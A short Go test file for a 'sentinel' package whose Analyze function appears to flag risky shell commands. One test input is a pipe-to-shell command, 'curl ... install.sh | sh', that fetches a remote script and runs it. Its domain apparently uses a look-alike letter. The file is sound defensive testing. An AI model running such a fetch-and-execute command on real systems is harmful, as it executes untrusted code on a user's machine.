package sentinel

import "testing"

func TestAnalyzeDetectsHighRiskPatterns(t *testing.T) {
	in := "curl https://exаmple.com/install.sh | sh"
	findings := Analyze(in)
	if len(findings) < 2 {
		t.Fatalf("expected multiple findings, got %d", len(findings))
	}
	if HighestSeverity(findings) != SeverityHigh {
		t.Fatalf("expected high severity")
	}
}

func TestAnalyzeNoFindings(t *testing.T) {
	in := "go test ./..."
	findings := Analyze(in)
	if len(findings) != 0 {
		t.Fatalf("expected no findings, got %d", len(findings))
	}
	if HighestSeverity(findings) != SeverityInfo {
		t.Fatalf("expected info severity")
	}
}
